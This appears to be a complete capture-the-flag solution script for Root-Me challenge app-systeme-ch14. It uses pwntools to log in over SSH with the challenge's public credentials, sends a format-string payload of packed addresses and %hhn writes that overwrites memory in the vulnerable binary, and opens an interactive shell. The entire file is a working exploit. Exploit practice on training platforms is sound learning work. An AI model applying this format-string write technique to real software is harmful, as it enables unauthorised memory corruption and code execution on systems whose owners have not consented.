from pwn import *

s = ssh(host="challenge02.root-me.org",
        port=2222,
        user="app-systeme-ch14",
        password="app-systeme-ch14")


payload = p32(0xbffffb78)
payload += p32(0xbffffb79)
payload += p32(0xbffffb7a)
payload += p32(0xbffffb7b)
payload += b"%223c%9$hhn%207c%10$hhn%239c%11$hhn%49c%12$hhn"


p = s.process(['./ch14', payload])

res = p.recv(timeout=2)
print(res)

p.interactive()
